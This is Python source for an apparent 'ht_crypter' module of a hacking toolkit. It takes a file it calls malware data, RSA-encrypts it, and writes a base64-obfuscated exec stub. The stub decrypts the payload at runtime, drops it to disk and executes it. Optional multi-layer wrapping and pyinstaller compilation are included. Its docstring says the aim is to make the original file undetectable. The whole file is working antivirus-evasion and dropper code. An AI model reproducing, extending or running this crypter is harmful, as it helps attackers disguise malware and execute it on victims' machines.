from hackingtools.core import Logger, Config
import hackingtools as ht 

import binascii
import sys
from argparse import ArgumentParser
import os.path
import math
from random import randint
import base64
import binascii
import random
import shutil
config = Config.getConfig(parentKey='modules', key='ht_crypter')

class StartModule():

	def __init__(self):
		Logger.printMessage(message='ht_crypter loaded', debug_core=True)
		pass

	def help(self):
		functions = ht.getFunctionsNamesFromModule('ht_crypter')
		Logger.printMessage(message=functions)
		return functions

	def getMalwareData(self, fileName):
		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
		file = open(fileName, "rb")
		file_data = file.read()
		file.close()
		return file_data

	def convertToExe(self, stub_name):
		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
		# Convert py to exe with pyinstaller
		import os
		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
		filename = '{file}.exe'.format(file=stub_name.split('.')[0].split('\\')[-1])

		file_to_move = os.path.abspath(os.path.join('dist', '{file}'.format(file=filename)))
		new_file = os.path.abspath(os.path.join(os.path.dirname(stub_name), filename))

		if os.path.isfile(file_to_move) and not os.path.isfile(new_file):
			os.rename(file_to_move, new_file)

		new_spec_file = '{name}.spec'.format(name=new_file.split('.')[0])
		if os.path.isfile(new_spec_file):
			os.remove(new_spec_file)

		build_dir = os.path.abspath(os.path.join('build', '{file}'.format(file=filename.split('.')[0])))
		if os.path.isdir(build_dir):
			shutil.rmtree(build_dir)

		if os.path.isfile(file_to_move):
			os.remove(file_to_move)

		spec_file = os.path.abspath('{file}.spec'.format(file=filename.split('.')[0]))
		if os.path.isfile(spec_file):
			os.remove(spec_file)

	def is_valid_file(self, parser, arg):
		if not os.path.exists(arg):
			parser.error("The file {file} does not exist!".format(file=arg))
		else:
			return arg

	def clean_output_dir(self):
		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
		if os.path.isdir(output_dir):
			shutil.rmtree(output_dir)

	def saveStub(self, stub, save_name, print_save_stub=True):
		# Save the Stub
		stub_name = save_name
		stub_file = open(stub_name, "w")
		stub_file.write(stub)
		stub_file.close()
		if print_save_stub:
			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)

	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
		# Create Stub in Python File
		stub = ''
		if is_last:
			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "drpnm = \"" + drop_file_name + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += """
def dcy(pk, cptx):
	k, n = pk
	mensajeRecibido = __reBa64__(cptx.encode('utf-8'))
	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)
	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]
	mensaje_de_ascii = __deAS__(mensajeDescifrado)
	decasc = __reBa64__(''.join(mensaje_de_ascii).encode())
	hexba64 = __ba64Hex__(decasc)
	ashex = __hexDec__(hexba64)
	deasc = __deAS__(ashex)
	ba64 = base64.b64decode(deasc.encode())
	return ba64
def __reBa64__(m):
	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]
	return mBa64
def __ba64Hex__(m):
	mHx = [base64.b64decode(b64) for b64 in m]
	return mHx
def __hexDec__(m):
	mDec = [int(hexa.decode("UTF-8"), 16) for hexa in m]
	return mDec
def __deAS__(m):
	m1 = ''.join([chr(d) for d in m])
	return m1
def __meAS__(m):
	men = [ord(p) for p in m]
	return men
dcy_data = dcy(pk=pk, cptx=cdx)
"""
		if is_iterating:
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\n"
			stub += "exec(dcy_data)"
		else:
			stub += """
image_extensions = ('jpg', 'jpeg', 'bpm', 'ico', 'png')
exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
python_extensions = ('py')
nf = open(drpnm, 'wb')
try:
	nf.write(dcy_data)
except:
	pass
nf.close()
if os.path.exists(drpnm):
	if drpnm.split('.')[1] in image_extensions:
		imageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
	if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
		os.system(drpnm)
	if drpnm.split('.')[1] in python_extensions:
		exec(dcy_data)
		proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""

		stub_base64 = base64.b64encode(stub.encode('utf-8'))
		stub = "import base64\n"
		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
		stub += "exec(base64.b64decode(data))"
		
		self.saveStub(stub, save_name, print_save_stub)

		if convert:
			self.convertToExe(save_name)

	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', is_iterating=False, prime_length=4, iterate_count=1, is_last=False, print_save_stub=True, compile_exe=False):
		"""
		filename es el archivo original a indetectar (filename='servidor.py')
		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
		drop_file_name es el nombre con el que se guarda trás ejecutarse el stub para poder ejecutarlo
		compile_exe es si queremos compilarlo con pyinstaller
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
		temp_filename = filename
		if iterate_count > 1:
			temp_filename = filename
			for i in range(1, iterate_count):
				if i == iterate_count - 1:
					is_last = True
				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, is_iterating=True, iterate_count=1, is_last=is_last, print_save_stub=False, compile_exe=False)
		
		filename = temp_filename
		if filename and new_file_name:
			crypter_rsa = ht.getModule('ht_rsa')
			data = self.getMalwareData(filename)
			prime_a, prime_b = crypter_rsa.getRandomKeypair(prime_length)
			public, private = crypter_rsa.generate_keypair(prime_a, prime_b)
			crypted_data = crypter_rsa.encrypt(private_key=private, plaintext=data)
			new_file = new_file_name
			if not '.' in new_file:
				new_file = '{file}.py'.format(file=new_file)

			if compile_exe:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last, convert=True)
				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
			else:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last)
			return new_file
		else:
			return None